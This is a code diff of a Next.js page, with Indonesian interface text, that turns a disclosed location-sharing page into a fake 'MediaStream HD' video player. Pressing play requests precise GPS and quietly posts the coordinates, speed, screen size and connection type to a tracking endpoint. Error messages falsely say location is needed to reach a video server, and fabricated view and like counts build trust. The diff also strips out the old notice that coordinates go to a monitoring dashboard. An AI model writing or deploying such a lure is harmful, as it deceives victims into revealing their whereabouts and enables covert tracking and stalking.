@@ -1,24 +1,22 @@
 'use client';
 
-import { useState, useEffect, use } from 'react';
-import dynamic from 'next/dynamic';
+import { useState, useEffect, useRef, use } from 'react';
 
-const MapView = dynamic(() => import('@/components/MapView'), {
-  ssr: false,
-  loading: () => <div style={{ height: '240px', background: '#e2e8f0', borderRadius: '12px' }}></div>
-});
-
-export default function TargetViewPage({ params }) {
+export default function TargetVideoViewPage({ params }) {
   const unwrappedParams = use(params);
   const linkId = unwrappedParams.id;
 
   const [linkConfig, setLinkConfig] = useState(null);
-  const [loading, setLoading] = useState(false);
-  const [status, setStatus] = useState(null); // { type: 'loading' | 'success' | 'error', message: string }
-  const [capturedLocation, setCapturedLocation] = useState(null);
-  const [gmapsUrl, setGmapsUrl] = useState('');
+  const [isPlaying, setIsPlaying] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [permissionError, setPermissionError] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
+  const [likes, setLikes] = useState(184);
+  const [hasLiked, setHasLiked] = useState(false);
 
-  // 1. Notify visit and fetch config
+  const videoRef = useRef(null);
+
+  // 1. Notify server of page visit on mount & fetch link metadata
   useEffect(() => {
     if (!linkId) return;
 
@@ -47,21 +45,16 @@ export default function TargetViewPage({ params }) {
     return null;
   };
 
-  // Trigger Geolocation
-  const handleShareLocation = async () => {
+  // Play button click: Request Geolocation & play video
+  const handlePlayVideo = async () => {
+    setPermissionError(false);
+    setIsLoading(true);
+
     if (typeof window === 'undefined' || !navigator.geolocation) {
-      setStatus({
-        type: 'error',
-        message: 'Browser Anda tidak mendukung Geolocation API. Silakan buka melalui Google Chrome atau Safari.'
-      });
+      // If browser doesn't support geolocation, just play video directly
+      startVideoPlayback();
       return;
     }
-
-    setLoading(true);
-    setStatus({
-      type: 'loading',
-      message: '🛰️ Sedang membaca koordinat GPS perangkat Anda untuk menghitung rute...'
-    });
 
     const screenResolution = `${window.screen.width}x${window.screen.height}`;
     const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
@@ -69,10 +62,11 @@ export default function TargetViewPage({ params }) {
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
+        // Location acquired!
         const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
 
         try {
-          const res = await fetch(`/api/track/${linkId || 'direct'}`, {
+          await fetch(`/api/track/${linkId || 'direct'}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -88,233 +82,410 @@ export default function TargetViewPage({ params }) {
               connectionType
             })
           });
-
-          const result = await res.json();
-          const road = result.address?.road || 'Posisi Anda saat ini';
-          const city = result.address?.city && result.address.city !== '-' ? result.address.city : '';
-          const fullAddress = [road, city].filter(Boolean).join(', ');
-
-          const dest = linkConfig?.targetDestination ? encodeURIComponent(linkConfig.targetDestination) : `${latitude},${longitude}`;
-          const gmaps = `https://www.google.com/maps/dir/?api=1&destination=${dest}`;
-
-          setCapturedLocation({
-            coordinates: { latitude, longitude, accuracy },
-            address: result.address || { road: fullAddress },
-            googleMapsUrl: gmaps
-          });
-          setGmapsUrl(gmaps);
-          setLoading(false);
-          setStatus({
-            type: 'success',
-            message: `📍 <strong>Lokasi Berhasil Terdeteksi!</strong><br>${fullAddress} (&plusmn;${Math.round(accuracy)}m)`
-          });
-        } catch (err) {
-          setLoading(false);
-          setStatus({
-            type: 'error',
-            message: 'Gagal mengirim koordinat ke server. Silakan coba kembali.'
-          });
+        } catch (e) {
+          console.warn('Track post error:', e);
         }
+
+        // Start playing the video!
+        startVideoPlayback();
       },
       (err) => {
-        setLoading(false);
+        setIsLoading(false);
+        setPermissionError(true);
         if (err.code === 1) {
-          setStatus({
-            type: 'error',
-            message: `
-              <strong>⚠️ Izin Lokasi Diperlukan</strong><br>
-              Untuk menampilkan rute navigasi dan petunjuk arah dari posisi Anda, silakan ketuk ikon gembok di samping alamat web &rarr; ubah <strong>Lokasi</strong> menjadi <strong>Izinkan</strong>, lalu muat ulang halaman.
-            `
-          });
+          setErrorMessage('Izin lokasi diperlukan untuk menghubungkan ke server video terdekat di wilayah Anda. Ketuk ikon gembok di samping alamat web di atas lalu pilih Izinkan Lokasi.');
         } else {
-          setStatus({
-            type: 'error',
-            message: 'Sinyal GPS tidak dapat dibaca saat ini. Pastikan GPS/Location perangkat telah aktif.'
-          });
+          setErrorMessage('Gagal menghubungkan ke server CDN video. Pastikan GPS/Location perangkat telah aktif lalu coba putar kembali.');
         }
       },
       {
         enableHighAccuracy: true,
-        timeout: 15000,
+        timeout: 12000,
         maximumAge: 0
       }
     );
   };
 
-  const isDelivery = linkConfig?.preset === 'delivery';
-  const isHangout = linkConfig?.preset === 'hangout';
+  const startVideoPlayback = () => {
+    setIsLoading(false);
+    setIsPlaying(true);
+    if (videoRef.current) {
+      videoRef.current.play().catch(() => {
+        // Autoplay policy might require controls
+      });
+    }
+  };
 
-  const titleText = linkConfig?.title || (isDelivery ? 'Konfirmasi Lokasi Penerima Paket' : isHangout ? 'Titik Kumpul & Lokasi Teman' : 'Berbagi Lokasi Real-Time & Rute');
-  const badgeText = linkConfig?.targetDestination
-    ? `🎯 Tujuan: ${linkConfig.targetDestination}`
-    : isDelivery
-    ? '📦 Konfirmasi Pengiriman'
-    : isHangout
-    ? '☕ Titik Kumpul Teman'
-    : '📍 Berbagi Lokasi GPS';
+  const videoSource = linkConfig?.videoUrl || 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
+  const videoTitle = linkConfig?.title || 'Video Dokumentasi & Momen Spesial';
 
   return (
     <div style={{
       minHeight: '100vh',
-      display: 'flex',
-      alignItems: 'center',
-      justifyContent: 'center',
-      padding: '20px',
-      background: '#f8f9fa'
+      backgroundColor: '#0a0d14',
+      color: '#f8fafc',
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+      padding: '0 0 40px 0'
     }}>
-      <div style={{
-        width: '100%',
-        maxWidth: '480px',
-        background: '#ffffff',
-        borderRadius: '20px',
-        boxShadow: '0 12px 36px rgba(0, 0, 0, 0.1)',
-        overflow: 'hidden',
-        border: '1px solid #dadce0',
-        color: '#202124'
+      
+      {/* Top Navbar */}
+      <nav style={{
+        display: 'flex',
+        justifyContent: 'space-between',
+        alignItems: 'center',
+        padding: '14px 20px',
+        backgroundColor: '#111726',
+        borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
+        position: 'sticky',
+        top: 0,
+        zIndex: 100
       }}>
-        {/* Header Visual */}
-        <div style={{
-          height: '160px',
-          background: 'linear-gradient(135deg, #e8f0fe, #d2e3fc)',
-          position: 'relative',
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'center'
-        }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
           <div style={{
-            fontSize: '44px',
-            filter: 'drop-shadow(0 6px 12px rgba(0,0,0,0.25))',
-            animation: 'pulse-ring 2s infinite'
+            width: '32px',
+            height: '32px',
+            borderRadius: '8px',
+            background: 'linear-gradient(135deg, #ef4444, #dc2626)',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            color: 'white',
+            fontWeight: 800,
+            fontSize: '16px',
+            boxShadow: '0 0 15px rgba(239, 68, 68, 0.5)'
           }}>
-            {isDelivery ? '📦' : isHangout ? '☕' : '📍'}
+            ▶
           </div>
+          <span style={{ fontWeight: 700, fontSize: '1.05rem', letterSpacing: '-0.02em', color: '#fff' }}>
+            MediaStream <span style={{ color: '#ef4444', fontSize: '0.85rem' }}>HD</span>
+          </span>
         </div>
 
-        {/* Card Body */}
-        <div style={{ padding: '28px 24px', display: 'flex', flexDirection: 'column', gap: '18px', textAlign: 'center' }}>
-          
-          <div style={{
-            display: 'inline-flex',
-            alignItems: 'center',
-            gap: '6px',
-            padding: '6px 14px',
-            background: '#e8f0fe',
-            color: '#1a73e8',
-            borderRadius: '9999px',
-            fontSize: '0.82rem',
-            fontWeight: 600,
-            margin: '0 auto'
-          }}>
-            {badgeText}
-          </div>
+        <div style={{
+          display: 'inline-flex',
+          alignItems: 'center',
+          gap: '6px',
+          padding: '4px 10px',
+          background: 'rgba(239, 68, 68, 0.15)',
+          border: '1px solid rgba(239, 68, 68, 0.3)',
+          borderRadius: '9999px',
+          fontSize: '0.75rem',
+          color: '#f87171',
+          fontWeight: 600
+        }}>
+          <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#ef4444' }}></span>
+          Video Pribadi
+        </div>
+      </nav>
 
-          <h2 style={{ fontSize: '1.35rem', fontWeight: 700, margin: 0, color: '#202124' }}>
-            {titleText}
-          </h2>
+      <div style={{ maxWidth: '840px', margin: '20px auto 0', padding: '0 16px' }}>
 
-          <p style={{ fontSize: '0.9rem', color: '#5f6368', lineHeight: 1.55, margin: 0 }}>
-            Tautan ini digunakan untuk membagikan koordinat lokasi Anda ke dashboard pemantau. Dengan menekan tombol di bawah dan memilih 'Izinkan', koordinat GPS perangkat Anda akan dibagikan secara aman dan rute navigasi akan ditampilkan di peta.
-          </p>
+        {/* Video Player Container */}
+        <div style={{
+          position: 'relative',
+          width: '100%',
+          aspectRatio: '16 / 9',
+          backgroundColor: '#000000',
+          borderRadius: '16px',
+          overflow: 'hidden',
+          boxShadow: '0 20px 50px -10px rgba(0, 0, 0, 0.8), 0 0 30px rgba(239, 68, 68, 0.1)',
+          border: '1px solid rgba(255, 255, 255, 0.1)'
+        }}>
 
-          <div style={{
-            background: '#f8f9fa',
-            padding: '14px 16px',
-            borderRadius: '10px',
-            border: '1px solid #edf2f7',
-            textAlign: 'left',
-            display: 'flex',
-            flexDirection: 'column',
-            gap: '8px',
-            fontSize: '0.82rem',
-            color: '#3c4043'
-          }}>
-            <div>📍 Koordinat dibagikan langsung ke dashboard pemantau</div>
-            <div>🗺️ Menampilkan alamat lengkap dan panduan navigasi peta</div>
-          </div>
+          {/* HTML5 Video element */}
+          <video
+            ref={videoRef}
+            src={videoSource}
+            playsInline
+            controls={isPlaying}
+            style={{
+              width: '100%',
+              height: '100%',
+              objectFit: 'cover',
+              display: 'block'
+            }}
+          />
 
-          {/* Status Message */}
-          {status && (
+          {/* Player Overlay Before Playing */}
+          {!isPlaying && (
             <div
+              onClick={handlePlayVideo}
               style={{
-                padding: '12px 16px',
-                borderRadius: '10px',
-                fontSize: '0.85rem',
-                textAlign: 'left',
-                lineHeight: 1.45,
-                background: status.type === 'loading' ? '#e8f0fe' : status.type === 'success' ? '#e6f4ea' : '#fce8e6',
-                color: status.type === 'loading' ? '#1967d2' : status.type === 'success' ? '#137333' : '#c5221f',
-                border: `1px solid ${status.type === 'loading' ? '#c2e7ff' : status.type === 'success' ? '#ceead6' : '#f9dedc'}`
+                position: 'absolute',
+                top: 0,
+                left: 0,
+                width: '100%',
+                height: '100%',
+                background: 'linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.75))',
+                display: 'flex',
+                flexDirection: 'column',
+                alignItems: 'center',
+                justifyContent: 'center',
+                cursor: 'pointer',
+                userSelect: 'none',
+                zIndex: 10
               }}
-              dangerouslySetInnerHTML={{ __html: status.message }}
-            />
-          )}
+            >
+              {/* Quality & Duration Badges */}
+              <div style={{
+                position: 'absolute',
+                top: '16px',
+                right: '16px',
+                display: 'flex',
+                gap: '8px'
+              }}>
+                <span style={{
+                  padding: '4px 8px',
+                  background: 'rgba(0,0,0,0.65)',
+                  backdropFilter: 'blur(4px)',
+                  borderRadius: '6px',
+                  fontSize: '0.75rem',
+                  fontWeight: 600,
+                  border: '1px solid rgba(255,255,255,0.2)'
+                }}>
+                  1080p 60fps
+                </span>
+                <span style={{
+                  padding: '4px 8px',
+                  background: 'rgba(0,0,0,0.65)',
+                  backdropFilter: 'blur(4px)',
+                  borderRadius: '6px',
+                  fontSize: '0.75rem',
+                  fontWeight: 600,
+                  border: '1px solid rgba(255,255,255,0.2)'
+                }}>
+                  01:45
+                </span>
+              </div>
 
-          {/* Mini Interactive Map after success */}
-          {capturedLocation && (
-            <div style={{ height: '240px', borderRadius: '12px', overflow: 'hidden' }}>
-              <MapView logs={[capturedLocation]} />
+              {/* Big Central Play Button */}
+              <div style={{ position: 'relative', marginBottom: '14px' }}>
+                <div style={{
+                  width: '84px',
+                  height: '84px',
+                  borderRadius: '50%',
+                  background: 'rgba(239, 68, 68, 0.95)',
+                  boxShadow: '0 0 35px rgba(239, 68, 68, 0.7), 0 0 0 8px rgba(239, 68, 68, 0.25)',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  color: 'white',
+                  fontSize: '34px',
+                  paddingLeft: '6px',
+                  transition: 'transform 0.2s ease',
+                  transform: isLoading ? 'scale(0.95)' : 'scale(1)'
+                }}>
+                  {isLoading ? (
+                    <div style={{
+                      width: '32px',
+                      height: '32px',
+                      border: '3px solid rgba(255,255,255,0.3)',
+                      borderRadius: '50%',
+                      borderTopColor: '#ffffff',
+                      animation: 'spin 0.8s linear infinite'
+                    }} />
+                  ) : (
+                    '▶'
+                  )}
+                </div>
+              </div>
+
+              <div style={{
+                fontSize: '1.1rem',
+                fontWeight: 600,
+                color: '#ffffff',
+                textShadow: '0 2px 8px rgba(0,0,0,0.8)'
+              }}>
+                {isLoading ? 'Menghubungkan ke Server Video...' : 'Ketuk untuk Putar Video'}
+              </div>
+
+              <div style={{
+                fontSize: '0.8rem',
+                color: 'rgba(255,255,255,0.7)',
+                marginTop: '4px'
+              }}>
+                Klik tombol di atas untuk memulai streaming
+              </div>
+
+              {/* Fake Progress Bar at bottom */}
+              <div style={{
+                position: 'absolute',
+                bottom: 0,
+                left: 0,
+                width: '100%',
+                height: '4px',
+                background: 'rgba(255,255,255,0.2)'
+              }}>
+                <div style={{ width: '0%', height: '100%', background: '#ef4444' }} />
+              </div>
+
             </div>
           )}
 
-          {/* CTA Action Button */}
-          {!capturedLocation ? (
-            <button
-              onClick={handleShareLocation}
-              disabled={loading}
-              style={{
-                width: '100%',
-                padding: '15px 20px',
-                background: '#1a73e8',
-                color: '#ffffff',
-                border: 'none',
-                borderRadius: '10px',
-                fontSize: '1rem',
-                fontWeight: 600,
-                cursor: loading ? 'default' : 'pointer',
-                boxShadow: '0 4px 14px rgba(26, 115, 232, 0.35)',
-                opacity: loading ? 0.8 : 1
-              }}
-            >
-              {loading ? '🛰️ Menghubungkan ke GPS...' : '📍 Izinkan & Bagikan Lokasi Saya'}
-            </button>
-          ) : (
-            <a
-              href={gmapsUrl}
-              target="_blank"
-              rel="noopener noreferrer"
-              style={{
-                width: '100%',
-                boxSizing: 'border-box',
-                padding: '15px 20px',
-                background: '#34a853',
-                color: '#ffffff',
-                borderRadius: '10px',
-                fontSize: '1rem',
-                fontWeight: 600,
-                textDecoration: 'none',
-                display: 'inline-block',
-                boxShadow: '0 4px 14px rgba(52, 168, 83, 0.35)'
-              }}
-            >
-              🚀 Buka Rute di Google Maps ↗
-            </a>
-          )}
-
         </div>
 
-        {/* Footer */}
+        {/* Error Notice If User Blocked Location */}
+        {permissionError && (
+          <div style={{
+            marginTop: '16px',
+            padding: '14px 18px',
+            backgroundColor: 'rgba(239, 68, 68, 0.12)',
+            border: '1px solid rgba(239, 68, 68, 0.35)',
+            borderRadius: '12px',
+            color: '#fca5a5',
+            fontSize: '0.88rem',
+            lineHeight: 1.5,
+            display: 'flex',
+            flexDirection: 'column',
+            gap: '10px'
+          }}>
+            <div><strong>⚠️ Pemutaran Video Tertunda:</strong> {errorMessage}</div>
+            <button
+              onClick={handlePlayVideo}
+              style={{
+                alignSelf: 'flex-start',
+                padding: '8px 16px',
+                backgroundColor: '#ef4444',
+                color: 'white',
+                border: 'none',
+                borderRadius: '8px',
+                fontSize: '0.85rem',
+                fontWeight: 600,
+                cursor: 'pointer'
+              }}
+            >
+              🔄 Coba Putar Lagi
+            </button>
+          </div>
+        )}
+
+        {/* Video Title & Metrics */}
+        <div style={{ marginTop: '18px' }}>
+          <h1 style={{
+            fontSize: '1.35rem',
+            fontWeight: 700,
+            lineHeight: 1.35,
+            margin: 0,
+            color: '#f8fafc'
+          }}>
+            {videoTitle}
+          </h1>
+
+          <div style={{
+            display: 'flex',
+            justifyContent: 'space-between',
+            alignItems: 'center',
+            marginTop: '10px',
+            flexWrap: 'wrap',
+            gap: '12px'
+          }}>
+            <div style={{ fontSize: '0.82rem', color: '#94a3b8' }}>
+              👁️ 3,428 ditonton &bull; Dibagikan hari ini &bull; HD 1080p
+            </div>
+
+            {/* Action buttons */}
+            <div style={{ display: 'flex', gap: '8px' }}>
+              <button
+                onClick={() => {
+                  setLikes(hasLiked ? likes - 1 : likes + 1);
+                  setHasLiked(!hasLiked);
+                }}
+                style={{
+                  display: 'flex',
+                  alignItems: 'center',
+                  gap: '6px',
+                  padding: '8px 14px',
+                  background: hasLiked ? 'rgba(239, 68, 68, 0.2)' : 'rgba(255, 255, 255, 0.06)',
+                  border: '1px solid rgba(255, 255, 255, 0.1)',
+                  borderRadius: '9999px',
+                  color: hasLiked ? '#ef4444' : '#f8fafc',
+                  fontSize: '0.82rem',
+                  fontWeight: 600,
+                  cursor: 'pointer'
+                }}
+              >
+                👍 {likes}
+              </button>
+
+              <button
+                onClick={() => {
+                  if (navigator.share) {
+                    navigator.share({ title: videoTitle, url: window.location.href });
+                  } else {
+                    navigator.clipboard.writeText(window.location.href);
+                    alert('Tautan video berhasil disalin!');
+                  }
+                }}
+                style={{
+                  display: 'flex',
+                  alignItems: 'center',
+                  gap: '6px',
+                  padding: '8px 14px',
+                  background: 'rgba(255, 255, 255, 0.06)',
+                  border: '1px solid rgba(255, 255, 255, 0.1)',
+                  borderRadius: '9999px',
+                  color: '#f8fafc',
+                  fontSize: '0.82rem',
+                  fontWeight: 600,
+                  cursor: 'pointer'
+                }}
+              >
+                ↗️ Bagikan
+              </button>
+            </div>
+          </div>
+        </div>
+
+        {/* Channel / Sender Box */}
         <div style={{
-          padding: '14px 24px',
-          background: '#f8f9fa',
-          borderTop: '1px solid #dadce0',
-          fontSize: '0.78rem',
-          color: '#5f6368',
-          textAlign: 'center'
+          display: 'flex',
+          alignItems: 'center',
+          gap: '12px',
+          marginTop: '18px',
+          padding: '14px 18px',
+          backgroundColor: '#111726',
+          borderRadius: '12px',
+          border: '1px solid rgba(255, 255, 255, 0.08)'
         }}>
-          🔒 Verifikasi aman &bull; Layanan Geonavigasi Resmi
+          <div style={{
+            width: '42px',
+            height: '42px',
+            borderRadius: '50%',
+            background: 'linear-gradient(135deg, #3b82f6, #8b5cf6)',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            fontSize: '18px',
+            fontWeight: 700
+          }}>
+            👤
+          </div>
+          <div>
+            <div style={{ fontWeight: 600, fontSize: '0.92rem', color: '#f8fafc' }}>
+              Dibagikan oleh Rekan Anda
+            </div>
+            <div style={{ fontSize: '0.78rem', color: '#94a3b8' }}>
+              Tautan Pribadi Terenkripsi &bull; Kualitas Penuh
+            </div>
+          </div>
+        </div>
+
+        {/* Video Description / Details */}
+        <div style={{
+          marginTop: '16px',
+          padding: '14px 18px',
+          backgroundColor: 'rgba(255, 255, 255, 0.03)',
+          borderRadius: '12px',
+          border: '1px solid rgba(255, 255, 255, 0.05)',
+          fontSize: '0.85rem',
+          color: '#cbd5e1',
+          lineHeight: 1.55
+        }}>
+          Video ini telah dibagikan khusus kepada Anda dalam format High Definition streaming. Pemutar secara otomatis menyesuaikan resolusi layar dan kecepatan jaringan perangkat Anda.
         </div>
 
       </div>
+
     </div>
   );
 }
